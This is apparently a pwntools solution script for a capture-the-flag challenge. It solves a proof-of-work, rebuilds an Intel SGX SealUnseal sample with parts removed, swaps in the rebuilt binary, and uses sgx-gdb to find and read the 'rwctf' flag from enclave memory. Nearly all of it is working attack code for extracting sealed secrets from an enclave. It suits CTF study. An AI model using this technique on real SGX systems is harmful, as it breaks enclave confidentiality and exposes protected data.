import string
from pwn import *
from hashlib import sha256
from pwnlib.util.iters import mbruteforce

import multiprocessing
multiprocessing.set_start_method('fork')

host, port = "47.89.253.15", 9999

def conn():
    return remote(host, port)

def solve(p):
    prompt = '#'

    p.recvuntil("sha256(\"")
    prefixes = p.recvuntil("\"")[:-1].decode()
    def brute(cur):
        content = prefixes + str(cur)
        s = sha256(content.encode())
        if s.hexdigest().startswith('000000') and int(s.hexdigest()[6:8], 16) < 0x40:
            return True
        return False

    log.info(f'prefix: {prefixes}')
    answer = mbruteforce(brute, string.ascii_lowercase + string.digits, method='upto', length=6, threads=20)
    p.sendline(answer)

    log.info("Build SGX")
    p.recvuntil(prompt)
    p.sendline("cd /opt/intel/sgxsdk/")
    p.recvuntil(prompt)
    p.sendline("source environment")
    p.recvuntil(prompt)
    p.sendline("cd SampleCode/SealUnseal/")
    p.recvuntil(prompt)
    p.sendline("cd App && sed -i '85,104d;122,187d;253,258d' App.cpp")
    p.recvuntil(prompt)
    p.sendline("cd .. && make")
    p.recvuntil(prompt)
    p.sendline("cp /root/app /root/app_old && cp app /root/app")
    p.recvuntil(prompt)
    p.sendline("cd /root")

    log.info("Start install GDB")
    p.recvuntil(prompt)
    p.sendline("apt install -y gdb")
    p.recvuntil("shared-mime-info")
    log.info("Setting up shared-mime-info (1.9-2) ...")

    p.recvuntil(prompt)
    log.info("Start debugging...")
    p.sendline("sgx-gdb app")
    prompt = '(gdb)'
    p.recvuntil(prompt)
    p.sendline('b unseal_data')
    p.recvuntil(prompt)
    p.sendline('run')
    p.recvuntil(prompt)
    p.sendline('ni')
    p.recvuntil(prompt)
    p.sendline('fin')
    p.recvuntil(prompt)
    p.sendline('info proc mappings')
    mappings = p.recvuntil(prompt).decode()
    mappings_enclave = [[
        word for word in line[:-1]
        if word != ''
    ] for line in list(filter(
        lambda _line: _line[-1] == '/dev/sgx/enclave',
        [_line.split(' ') for _line in mappings.split('\n')]
    ))]
    # for target in mappings_enclave:
    #     p.sendline(f'find {target[0]}, {target[1]}-1, {{char[5]}}"rwctf"')
    #     result = p.recvuntil(prompt)
    #     if b"Pattern not found." not in result:
    #         break
    target = next(line for line in mappings_enclave if line[-1] == '0x1000')
    p.sendline(f'find {target[0]}, {target[1]}-1, {{char[5]}}"rwctf"')
    result = p.recvuntil(prompt).decode().split('\n')
    p.sendline(f'x/s {result[0]}')
    p.recvuntil('"')
    flag = p.recvuntil('"')[:-1]
    log.success(flag)
    p.sendline('q')

if __name__ == "__main__":
    p = conn()
    solve(p)
    p.close()
